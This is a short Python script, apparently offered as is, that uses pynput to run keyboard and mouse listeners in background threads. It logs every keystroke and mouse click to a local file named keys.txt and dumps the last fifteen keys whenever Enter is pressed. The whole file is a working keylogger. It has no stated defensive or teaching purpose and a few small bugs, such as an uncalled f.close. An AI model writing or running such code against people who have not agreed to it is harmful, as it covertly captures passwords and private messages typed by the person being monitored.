from pynput import keyboard
from pynput import mouse
import threading
from threading import Thread
saved = []


def on_press(key):
    #print('Key {} Pressed'.format(key))
    saved.append(key)


def on_click(x, y, button, pressed):
    #print('{0} at {1}'.format('Pressed' if pressed else 'Released',(x, y)))
    f = open("keys.txt", "a+")
    if pressed:
        f.write("Mouse Clicked")
    f.write("\n")
    f.close

        
def on_release(key):
    #print('Key {} Released'.format(key))
    f = open("keys.txt", "a+")
    f.write(str(key))
    f.write("\n")
    if str(key) == 'Key.esc':
        print('Exiting...')
        exit()
    if str(key) == 'Key.enter':
        size = len(saved)
        if size >= 15:
            j = 15
        else:
            j = size
        for i in range (size - j, size):
            if saved:
                saved_key = saved[i]
                f.write(str(saved_key) + " ")
        f.write("\n")
        f.close()


def func1():
    with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()


def func2():
    with mouse.Listener(on_click = on_click) as listener1:
        listener1.join()


if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()


